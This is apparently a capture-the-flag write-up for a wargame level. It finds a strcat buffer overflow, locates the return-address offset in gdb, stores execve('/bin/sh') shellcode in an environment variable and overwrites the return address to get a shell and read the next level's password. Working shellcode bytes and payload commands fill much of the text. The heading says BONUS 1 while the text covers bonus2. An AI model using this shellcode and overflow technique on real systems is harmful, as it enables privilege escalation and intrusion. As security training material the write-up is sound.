## BONUS 1
---
### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
---

We're becoming familiar the automatisms to solve these levels. As usual, we start by looking the code. The code is too long to be displayed here, so I will just show the part that is interesting for us. If you want to see that whole code, you can find it [here](./src/bonus2.c).

Now that we understand what this code does. We can start our research to exploit this code.

First we need to find the vulnerabity inside the code. The first thing that I noticed is the `strncpy` and `strcat` calls. Let's take a look to find a potential vulnerability.

```c
int
main (int argc, char **argv) {
	char	buffer[72];
[...]
	strncpy(buffer, argv[1], 40);
	strncpy(&buffer[40], argv[2], 32);
[...]
	greetuser(buffer);
}

void
greetuser (char *user) {
	char	buffer[64];
[...]
	strcat(buffer, user);
[...]
}
```

That's interesting! We have two buffers, and it appears that the `greetuser` function copies a buffer larger than its size. This indicates a potential buffer overflow vulnerability. By examining the code, I can see that the buffer inside the `greetuser` function can be filled up to 85 bytes (72 + 13). Therefore, I can overflow the return value of the `greetuser` function.

Now that we have identified the vulnerability and the target for the buffer overflow, the next step is to consider how to obtain the flag. Since the code does not contain any `system` calls, we will need to use a ShellCode. In this case, we can utilize the same ShellCode that we used in previous levels.

The only question im asking to myself is where to put this ShellCode ?

We have two options:
1. Put the ShellCode inside the first argument.
2. Put the ShellCode inside environment variables.

Let's use the second option because we saw in the bonus0 that running code from stack isn't easy !

First I need to find the distance between the buffer in `greetuser` and it's return address. To do that, I will use the `gdb`.

```bash
(gdb) x/a $ebp+4
0xbffff62c:	0x8048630 <main+263>
(gdb) x/32s $esp
[...]
0xbffff5e0:	 "Hello "
[...]
```

So the distance is 0x4c (76 in decimal). You need to remove 6 because of the "Hello " string.
In my case, I will remove 13 because I will set LANG to `fi` and the buffer will be filled with "Hyvää päivää ".
So the distance is 76 - 13 = 63.

Before to fo further I need to be sure of these numbers.

```shell
(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*19 + "1234"'`
Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*19 + "1234"'`
(gdb) x/32a $ebp
0xbffff638:	0x41414141	0x33323141	0x41410034	0x41414141
```

Oh, it's always good to check, as we can see the padding isn't good I have to remove 1 byte from the second argument !

```shell
(gdb) r `python -c 'print "A"*40'` `python -c 'print "A"*18 + "1234"'`
Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*18 + "1234"'`
(gdb) x/32a $ebp
0xbffff638:	0x41414141	0x34333231	0x41414100	0x41414141
```

Perfect ! Now we can continue.
I need to get the address where is store the environment variables.

```shell
$ export SHELLCODE=$(python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

(gdb) x/s *((char **)environ)
0xbffff8b2:	 "SHELLCODE=\220\220\220\220[...]
```

I will add 0x20 to this address to be sure to be inside the NOP operators and skip the variable name.
    
```shell
(gdb) x/s *((char **)environ)+32
0xbffff8d2:	 "\220\220\220\220\220\220[...]
```

Now I can start to build my payload.

```shell
$ python -c 'print "\x90" * 40' > /tmp/payload_part1
$ python -c 'print "\x90" * 18 + "\xd2\xf8\xff\xbf"' > /tmp/payload_part2
$ ./bonus `cat /tmp/payload_part1` `cat /tmp/payload_part2`
Hyvää päivää ��������������������������������������������������������������
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
